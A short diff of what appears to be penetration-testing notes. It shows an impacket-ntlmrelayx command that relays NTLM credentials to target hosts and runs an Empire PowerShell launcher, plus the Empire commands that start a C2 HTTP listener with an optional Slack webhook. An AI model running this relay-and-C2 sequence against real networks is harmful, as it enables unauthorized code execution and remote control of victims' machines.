@@ -18,7 +18,8 @@ llmnr: sudo impacket-ntlmrelayx -tf targets.txt -c <insert your Empire Powershel
 	(Empire) > listeners
 	(Empire: listeners) > uselistener http 
 	(Empire: listeners/http) > set Port 80 #or other port
-	(Empire: listeners/http) >set SlackChannel https://hooks.slack.com/services/<codepath>/  #OPTIONAL
+	(Empire: listeners/http) > set SlackChannel https://hooks.slack.com/services/<codepath>/  #OPTIONAL
+	(Empire: listeners/http) > execute
 	(Empire) > agents
 	(Empire: agents) > listeners
 
